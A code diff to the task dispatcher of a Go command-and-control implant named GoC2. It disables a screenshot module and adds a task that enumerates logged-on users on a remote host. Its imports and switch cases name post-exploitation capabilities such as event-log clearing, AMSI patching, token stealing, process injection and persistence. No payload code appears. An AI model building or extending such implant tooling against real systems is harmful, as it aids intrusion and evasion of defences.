@@ -33,7 +33,8 @@ import (
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/listports"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/listservices"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/listshares"
-	"github.com/latortuga71/GoC2/internal/modules/enumeration/screenshot"
+
+	//"github.com/latortuga71/GoC2/internal/modules/enumeration/screenshot"
 	"github.com/latortuga71/GoC2/internal/modules/evasion/cleareventlog"
 	"github.com/latortuga71/GoC2/internal/modules/evasion/hookchecker"
 	"github.com/latortuga71/GoC2/internal/modules/evasion/patchamsi"
@@ -55,6 +56,7 @@ import (
 	"github.com/latortuga71/GoC2/internal/modules/impersonation/stealtoken"
 	"github.com/latortuga71/GoC2/internal/modules/lateralmovement/admincheck"
 	"github.com/latortuga71/GoC2/internal/modules/lateralmovement/exectools"
+	"github.com/latortuga71/GoC2/internal/modules/lateralmovement/loggedonusers"
 	"github.com/latortuga71/GoC2/internal/modules/lateralmovement/scanner"
 	"github.com/latortuga71/GoC2/internal/modules/persistence/addusertogroup"
 	"github.com/latortuga71/GoC2/internal/modules/persistence/crontab"
@@ -225,9 +227,9 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		result, cmdError = processinjection.SpawnInjectWithToken(t.File, t.Args[0], t.Args[1])
 	case "load-custom-pe":
 		result, cmdError = processinjection.LoadPE(t.File, t.Args)
-	case "screenshot":
-		result, cmdError = screenshot.Screenshot()
-		screenshotTask = true
+	//case "screenshot":
+	//	result, cmdError = screenshot.Screenshot()
+	//	screenshotTask = true
 	case "logon-user-netonly":
 		result, cmdError = runbinary.RunAsNetOnly(t.Args)
 	case "logon-user":
@@ -380,6 +382,8 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		cmdError = nil
 	case "list-remote-services":
 		result, cmdError = exectools.ListRemoteServices(t.Args[0])
+	case "list-loggedon-users":
+		result, cmdError = loggedonusers.EnumLoggedOnUsers(t.Args[0])
 	case "info":
 		result, cmdError = Client.Info(), nil
 	default:
